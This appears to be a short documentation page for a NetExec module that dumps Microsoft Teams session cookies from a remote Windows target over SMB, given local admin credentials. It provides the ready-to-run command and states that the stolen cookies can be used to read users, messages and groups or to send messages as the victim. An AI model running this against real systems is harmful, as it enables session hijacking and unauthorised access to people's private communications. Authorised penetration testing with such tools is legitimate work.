# Steal Microsoft Teams cookies

{% hint style="warning" %}
You need at least local admin privilege on the remote target
{% endhint %}

New NetExec module to dump Microsoft Teams cookies thanks to [@KuiilSec](https://twitter.com/KuiilSec) contribution. You can use them to retrieve informations like users, messages, groups etc or send directly messages in Teams.

```
$ NetExec smb <ip> -u user -p pass -M teams_localdb
```
